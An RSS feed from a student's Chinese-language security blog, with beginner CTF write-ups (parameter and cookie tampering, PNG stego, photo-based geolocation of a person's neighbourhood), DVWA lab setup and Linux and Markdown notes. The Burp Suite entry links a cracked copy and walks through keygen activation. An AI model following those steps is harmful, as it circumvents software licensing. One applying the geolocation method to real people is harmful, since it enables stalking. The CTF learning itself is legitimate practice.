      <description>前言-2021/8/10 今天学长在群里发了西电的新生CTF比赛，题目较为基础，适合我们初学者。
想来还是感慨颇多的，西电不愧是网安的头部院校，信安的新生还没入学就开始打CTF比赛了，我大二了才刚刚踏入大门而已。
1. Web安全入门指北-GET &amp;lt;?php include &amp;#34;flag.php&amp;#34;; $moe = $_GET[&amp;#39;moe&amp;#39;]; if ($moe == &amp;#34;flag&amp;#34;) { echo $flag; }else { highlight_file(__FILE__); } 签到题。已给出源代码，根据题目提示，可以看出是一个简单的get命令题。
在地址栏中发送get请求：
http://47.93.215.154:10000/?moe=flag
得到flag：
moectf{We1c0me_t0_CTF_Web!}
2. Web安全入门指北-POST &amp;lt;?php include &amp;#34;flag.php&amp;#34;; $moe = $_POST[&amp;#39;moe&amp;#39;]; if ($moe == &amp;#34;flag&amp;#34;) { echo $flag; }else { highlight_file(__FILE__); } 给出源代码，只需要发送post请求给moe变量赋值flag即可。
用hackbar：
在post参数里填入moe=flag
Execute执行即可得flag:moectf{POST_1s_an_1mp0rtant_m3th0d!}
3. Web安全入门指北-小饼干 这道题非常有意思，通过网页提示:
You are not VIP,I will give flag to VIP!
可以大致猜测要伪造某些访问项目，将非VIP改为VIP。
用Burp Suite抓包得到，有一个cookie项为VIP=0，可以通过篡改VIP值来达到伪造cookies的目的。
将抓包结果发送到重发器，将VIP值改为1，点击发送。
得到flag。
4. 2048 打开环境，发现是一个2048小游戏</description>
    </item>
    
    <item>
      <title>DVWA环境搭建 &#43; BurpSuite2.1安装 &#43; Chrome配置</title>
      <link>https://shenyiming.life/post/9.dvwa%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA&#43;burpsuite2.1%E5%AE%89%E8%A3%85/</link>
      <pubDate>Thu, 05 Aug 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyiming.life/post/9.dvwa%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA&#43;burpsuite2.1%E5%AE%89%E8%A3%85/</guid>
      <description>[TOC]
DVWA环境搭建  DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。
 DVWA运行基于LAMP（Linux+Apache+MySQL+PHP），出于时间和个人能力的考虑，很难成功地从0开始搭建这样一套体系，故而使用小皮的PHPStudy环境。
PHPStudy：https://www.xp.cn/
DVWA：http://www.dvwa.co.uk/
一、安装PHP Study 二、配置DVWA 将下载的DVWA压缩包解压到PHP Study的WWW目录下并解压，进入目录中的config文件夹，编辑config.inc.php文件，找到_DVWA[&#39;db_password&#39;]=&#39;root&#39;行，将user改为‘root’；password改为‘root’。
三、配置PHP Study 开启Apache和PHP服务，点击左边栏网站，左上角创建网站，域名为设置为本机本地域名，查看本地域名方法：进入powershell输入命令ipconfig查看，我电脑本机域名为192.168.0.104
为什么不设置为localhost 127.0.0.1：Burp Suite配合chrome浏览器抓包时可能无法拦截localhost的数据。
根目录指向刚刚解压的DVWA-master目录下，点击确认，网站创建成功。
四、浏览器进入192.108.0.104 点击Create/Reset Database创建数据库
用户名：admin 默认密码：password
登陆进入后即部署成功。
BurpSuite2.1安装  BurpSuite 是用于攻击web 应用程序的集成平台，包含了许多工具。Burp Suite为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP 消息、持久性、认证、代理、日志、警报。
 1. JDK及BurpSuite破解版下载 链接：https://pan.baidu.com/s/11lrFGT0aGCd4BQcAJrL55w 提取码：w5lg
2. 配置JAVA环境 安装好jdk后，右键计算机-属性-系统设置-高级-环境变量
新增两个环境变量
  %JAVA_HOME%=jdk安装文件夹所在位置，如...\jdk1.8.0_201
  %CLASSPATH%=.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar
  修改path变量，分别添加jdk和jre安装文件夹下的bin目录。
3. 激活BurpSuite jdk配置完毕后，先打开burp-loader-keygen.jar文件
点击run
将license许可证复制入弹出的框中，点击Next，选择Manual activation手动激活。
将生成的申请码粘贴入注册机中，自动算号，将生成的激活码复制入框中，点击Next即激活成功。
此后想打开Burp Suite，双击运行目录下的VBS脚本即可。
BurpSuite Chrome配置 1. 设置流量代理Proxy ​	在谷歌应用商店中安装Falcon Proxy，添加一个新的代理127.</description>
    </item>
    
    <item>
      <title>MISC类型题目及技巧</title>
      <link>https://shenyiming.life/post/6.bugku_misc/</link>
      <pubDate>Fri, 23 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyiming.life/post/6.bugku_misc/</guid>
      <description>图片隐写  图片EXIF信息 GIF图片 文件头 16进制编码  编码 Readflag
社工   Bugku社工_进阶收集
根据题目给出的说说截图，有如下信息：
 终点位置突出特征：有塔      坐地铁需要7站，中间还要转一站
 出发站为始发站 家位置在始发站和第二站的中间位置  根据以上信息，先对说说配图进行百度识图，查找到地理位置为西安大雁塔，对照西安地铁图，距离大雁塔站有7站且为始发站的站点只有韦曲南站，至此即可确定小美所住的小区在韦曲南站和航天城站之间，利用百度地图标尺画两个圆，可以大致确定符合条件的7家小区，挨个尝试可得flag。
   Bugku_隐写)
题目文件为一张PNG格式图片，Windows自带图片浏览器无法正常打开该图片，说明图片内容经过人为篡改。使用工具TweakPng查看png内容，将图片大小的chunk部分高度修改为宽度一致，500px，保存，图片flag得以正常显示。
正常做法：用Python脚本计算和图片大小相匹配的正常宽高，再利用Tweakpng查看并修改。
  </description>
    </item>
    
    <item>
      <title>暑假CTF学习计划</title>
      <link>https://shenyiming.life/post/4.%E5%81%87%E6%9C%9F%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/</link>
      <pubDate>Thu, 22 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyiming.life/post/4.%E5%81%87%E6%9C%9F%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/</guid>
      <description>学习内容 根据上一篇笔记选择的比赛方向：Web和Crypto，安排并希望在假期进行以下内容的学习：
  Python编程基础-网络编程，并提升Python的水平取代C++成为自己最熟练的编程语言。
  Linux系统学习（基于Ubuntu 18.04）目标：建站
  SQL注入（SQL基本语法）
  PHP基本语法
  学习计划 假期苦短，每天效率也不高，单纯的看视频/看书想必毫无持续性，故而学习务必要结合实例，如我将《Learn Python 3 the HARD WAY》这本书作为Python的入门书籍，书中有大量例子，一个一个做下去有成就感推动前进，又能很好的掌握基础知识。
   7.23-8.5 学习python 完成抓包项目     8.6-8.10 学习LINUX系统 BUGKU站刷题   8.11-8.15 Linux系统实战-建站   8.16-8.27 学习SQL注入相关知识    </description>
    </item>
    
    <item>
      <title>CTF比赛方向选择</title>
      <link>https://shenyiming.life/post/3.ctf%E6%AF%94%E8%B5%9B%E6%96%B9%E5%90%91%E9%80%89%E6%8B%A9/</link>
      <pubDate>Wed, 21 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyiming.life/post/3.ctf%E6%AF%94%E8%B5%9B%E6%96%B9%E5%90%91%E9%80%89%E6%8B%A9/</guid>
      <description>了解CTF  CTF 的前身是传统黑客之间的网络技术比拼游戏，起源于 1996 年第四届 DEFCON。CTF比赛有以下突出特点：
 比赛侧重于对计算机底层和系统安全的核心能力，Web 漏洞攻防技巧完全被忽略。 竞赛环境趋向多 CPU 指令架构集，多操作系统，多编程语言。 采用「零和」计分规则。 团队综合能力考验：逆向分析、漏洞挖掘、漏洞利用、漏洞修补加固、网络流量分析、系统安全运行维护以及安全方面的编程调试。   CTF竞赛内容 常见六个分类
  Web - 网络攻防
考察Web安全中的常见漏洞，如SQL注入、XSS、CSRF、文件包含、文件上传、代码审计。Web安全题型最为常见。
  RE - 逆向工程
反编译、软件保护、反调试、软件加壳脱壳。
  PWN - 二进制漏洞
与计算机操作系统底层相关，主要出现在Linux平台上。
  Crypto - 密码学
古典密码与现代密码学安全两方面
  Mobile - 移动安全
安卓逆向相关
  MISC - 安全杂项
信息搜集（社工）、编码分析、取证分析、隐写分析等
  比赛学习方向选择 基于我个人对于六个分类的了解，我选择Web方向与Crypto方向。
  Web
作为一个尝试过Minecraft自建服务器、外网vps搭梯子（学习用）、购置域名建WordPress小站、提取视频网站M3U8下载地址的ctf beginner，Web方向是我最为感兴趣和想学习的方向，也是我认为最有应用性和最能获得成就感的方向。Web方向知识面的广度很宽，涉及范围相当大，故而学习需要恒心。
  Crypto
选择这个方向的原因很简单，我是目前所读专业即为信息安全（密码学方向） 故而此方向与学科所学相关，虽难但也必须披荆斩棘，筚路蓝缕。
  次要方向：PWN</description>
    </item>
    
    <item>
      <title>Ubuntu 18.04 LTS的配置与入门</title>
      <link>https://shenyiming.life/post/2.ubuntu%E9%85%8D%E7%BD%AE%E5%8F%8A%E5%91%BD%E4%BB%A4%E5%85%A5%E9%97%A8/</link>
      <pubDate>Tue, 20 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyiming.life/post/2.ubuntu%E9%85%8D%E7%BD%AE%E5%8F%8A%E5%91%BD%E4%BB%A4%E5%85%A5%E9%97%A8/</guid>
      <description>系统选择 Linux有多种发行版，作为一名小白，我选择Ubuntu的原因是以前用过并且感觉桌面界面十分讨喜，再者，Ubuntu作为常见的个人桌面操作系统，使用人数相对较多，教程也更多，对萌新十分友善。
载体 最标准的方式当然是重装系统咯，总是佩服小时候爱捣鼓的自己，想格盘就格盘，说重装就重装了，长大以后，不知是懒了还是如何，很难再去断舍离了，只能继续看着又快满的C盘抱残守旧了，单系统不可取，双系统也要重新给硬盘分区，过于麻烦，那就传统的VMware虚拟机吧，在去Ubuntu官网下载镜像时，发现了一个全新的选择：Windows WSL，即Windows Subsystem for Linux，籍此可以直接在Windows 10上运行Ubuntu，安装便捷，启动快速，就决定是你了！
系统配置（学习网址：CSDN博客）  安装好后首先设置root用户, 更换apt数据源  sudo passwd root su root cd /etc/apt cp sources.list sources.list.bak #备份配置文件 vim sources.list #编辑配置文件 将配置文件内容更改为阿里云镜像源  deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse deb-src http://mirrors.</description>
    </item>
    
    <item>
      <title>学习Markdown语法</title>
      <link>https://shenyiming.life/post/1.markdown%E7%AC%94%E8%AE%B0%E5%AD%A6%E4%B9%A0/</link>
      <pubDate>Mon, 19 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyiming.life/post/1.markdown%E7%AC%94%E8%AE%B0%E5%AD%A6%E4%B9%A0/</guid>
      <description>2021年7月18日 了解Markdown Markdown是一种轻量级标记语言，属于HTML格式的一种，易读易写易更改，处处透着极简主义的影子。在GitHub等网站上使用极广，更可以跨平台使用。
Windows桌面端软件选择 Web网页版有简书等知名博客网站可作记录，千挑万选后我选择了Typora。优点如下：
 有中文版。这一点可能不足为道，因为菜单的语言并不影响我们的使用，然而，不支持中文意味着软件对中文输入法的适配甚至中文文本的显示都极为差劲，这一点是我由MarkdownPad的使用中发现的。 Typora支持即时渲染技术，非常方便新人学习熟练。 Typora可以将md文件导出为pdf格式作发布用，对于笔记爱好者来说成就感满满。  Markdown语法  区块引用
 代码引用：
printf(&amp;quot;使用反引号包裹代码&amp;quot;)
int main() { int a; scanf(&amp;#34;%d&amp;#34;,&amp;amp;a); printf(&amp;#34;%d&amp;#34;,a++); return 0; } emoji: :smile:
公式： $$ lim_{x \to\infty} \exp(-x) = 0 $$ 插入图片：</description>
    </item>
    
    
    
  </channel>
</rss>
